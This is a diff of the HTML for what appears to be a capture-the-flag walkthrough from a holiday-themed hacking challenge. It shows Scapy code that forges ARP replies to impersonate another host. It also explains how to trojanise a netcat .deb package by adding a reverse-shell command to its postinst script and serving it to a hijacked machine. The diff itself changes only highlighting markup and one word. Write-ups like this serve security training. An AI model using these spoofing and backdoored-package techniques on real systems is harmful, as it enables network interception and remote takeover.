@@ -683,8 +683,8 @@ I'm sure glad you're here Santa.</p>
 13
 14
 15</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="n">ARP</span> <span class="ow">in</span> <span class="n">packet</span> <span class="ow">and</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">op</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">ether_resp</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwsrc</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="mh">0x0806</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">macaddr</span><span class="p">)</span>
-
+<span class="hll">    <span class="n">ether_resp</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwsrc</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="mh">0x0806</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">macaddr</span><span class="p">)</span>
+</span>
     <span class="n">arp_response</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span><span class="p">)</span>
     <span class="n">arp_response</span><span class="o">.</span><span class="n">op</span> <span class="o">=</span> <span class="mi">2</span>
     <span class="n">arp_response</span><span class="o">.</span><span class="n">plen</span> <span class="o">=</span> <span class="mi">4</span>
@@ -692,8 +692,8 @@ I'm sure glad you're here Santa.</p>
     <span class="n">arp_response</span><span class="o">.</span><span class="n">ptype</span> <span class="o">=</span> <span class="mh">0x0800</span>
     <span class="n">arp_response</span><span class="o">.</span><span class="n">hwtype</span> <span class="o">=</span> <span class="mh">0x01</span>
 
-    <span class="n">arp_response</span><span class="o">.</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">macaddr</span>
-    <span class="c1"># we need to make it look as if this came from the original host, not us!</span>
+<span class="hll">    <span class="n">arp_response</span><span class="o">.</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">macaddr</span>
+</span>    <span class="c1"># we need to make it look as if this came from the original host, not us!</span>
     <span class="n">arp_response</span><span class="o">.</span><span class="n">psrc</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">pdst</span>
     <span class="n">arp_response</span><span class="o">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">hwsrc</span>
     <span class="n">arp_response</span><span class="o">.</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">ARP</span><span class="p">]</span><span class="o">.</span><span class="n">psrc</span>
@@ -772,7 +772,7 @@ I'm sure glad you're here Santa.</p>
 <p><img alt="Packet capture 3" src="../../img/objectives/o9/packet_capture_3.png" /></p>
 <p>Running a simple Python web server using <code>python3 -m http.server 80</code> will tell us that Jack's hijacked machine is making a failed HTTP GET request to <code>/pub/jfrost/backdoor/suriv_amd64.deb</code>. Let's host a <a href="http://www.wannescolman.be/?p=98">malicious payload</a> there. <img alt="😈" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f608.svg" title=":smiling_imp:" /></p>
 <h3>Create the payload</h3>
-<p>The best package candidate in <code>~/debs/</code> is probably <code>netcat-traditional_1.10-41.1ubuntu1_amd64.deb</code> as it will install the <code>nc</code> binary we need to establish the <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">reverse shell</a> connection back to our machine. It also provides a <code>postinst</code> file where we can add the reverse shell command itself to make it execute as part of the package post-install phase.</p>
+<p>The best package candidate in <code>~/debs/</code> is probably <code>netcat-traditional_1.10-41.1ubuntu1_amd64.deb</code> as it will install the <code>nc</code> binary we need to establish the <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">reverse shell</a> connection back to our machine. It also provides a <code>postinst</code> file where we can add the reverse shell command itself to make it execute as part of the package post-install process.</p>
 <p>To help remove some of the tedious packaging and setup work create a <a href="../../tools/objectives/o9/prepare_package.sh"><code>prepare_package.sh</code></a> script that unpacks <code>netcat-traditional_1.10-41.1ubuntu1_amd64.deb</code> (lines 9-13), adds the <code>nc</code> reverse shell command to the <code>postinst</code> file (line 18), packages everything back up (line 20), creates the proper directory structure for the HTTP request to succeed (line 22), and start a Python web server to host the <code>.deb</code> file (line 27).</p>
 <table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
  2
